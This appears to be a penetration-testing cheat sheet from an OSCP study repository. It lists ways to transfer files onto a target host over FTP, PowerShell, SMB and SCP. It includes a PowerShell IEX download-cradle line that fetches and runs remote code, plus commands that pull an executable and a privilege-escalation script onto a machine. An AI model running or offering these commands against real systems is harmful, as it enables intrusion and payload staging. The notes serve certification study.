# File Transfer

15 Ways to transfer a file [https://blog.netspi.com/15-ways-to-download-a-file/#perl](https://blog.netspi.com/15-ways-to-download-a-file/#perl)

### [](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Transfer.md#ftp)FTP

/etc/init.d/pure-ftpd restart

Windows echo "open ">ftp.txt  
echo "offsec">>ftp.txt  
echo "offsec">>ftp.txt  
echo "bin">>ftp.txt  
echo "get file.exe">>ftp.txt  
echo "bye">>ftp.txt

ftp -s ftp.txt

Linux ftp -4 -d -v ftp://offsec:offsec@127.0.0.1//linuxprichecker.py < ftp upload one liner linux

### [](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Transfer.md#powershell)Powershell

powershell.exe (New-Object System.Net.WebClient).DownloadFile("[https://example.com/archive.zip](https://example.com/archive.zip)", "C:\Windows\Temp\archive.zip")

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http:///<script>')"

powershell full path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe

### [](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Transfer.md#smbsever)Smbsever

impacket-smbserver

net view \\<ip>

### [](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Transfer.md#scp)SCP

After login through ssh scp user@remote:/path